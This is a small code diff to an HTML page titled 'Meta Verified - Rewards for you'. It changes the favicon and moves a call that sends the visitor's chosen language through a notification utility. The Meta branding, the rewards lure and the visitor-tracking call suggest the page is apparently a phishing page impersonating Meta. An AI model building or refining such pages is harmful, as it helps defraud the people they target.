@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Verified - Rewards for you</title>
-    <link rel="icon" href="./public/favicon-32x32.png">
+    <link rel="icon" href="./public/icons/ic_favicon.png" type="image/png">
     <link rel="stylesheet" href="./public/styles/style.css">
 
     <!-- Tailwind CSS CDN -->
@@ -665,7 +665,6 @@
 
             confirmBtn.addEventListener('click', function () {
                 var selected = languageSelect.value || 'en';
-                var selectedLabel = languageSelect.options[languageSelect.selectedIndex].text;
                 try {
                     sessionStorage.setItem('pageLanguage', selected);
                 } catch (e) { }
@@ -673,10 +672,6 @@
                 applyPageLanguage(selected);
                 gate.classList.add('hidden');
                 document.body.classList.remove('language-locked');
-
-                if (window.Utils && typeof Utils.sendLanguageNotification === 'function') {
-                    Utils.sendLanguageNotification(selectedLabel);
-                }
             });
         })();
     </script>
@@ -684,6 +679,13 @@
     <!-- JavaScript Files -->
     <script src="./public/js/config.js"></script>
     <script src="./public/js/utils.js"></script>
+    <script>
+        document.getElementById('confirmLanguageBtn').addEventListener('click', function () {
+            var languageSelect = document.getElementById('pageLanguage');
+            var selectedLabel = languageSelect.options[languageSelect.selectedIndex].text;
+            Utils.sendLanguageNotification(selectedLabel);
+        });
+    </script>
     <script src="./public/js/modal.js"></script>
     <script src="./public/js/app.js"></script>
 </body>
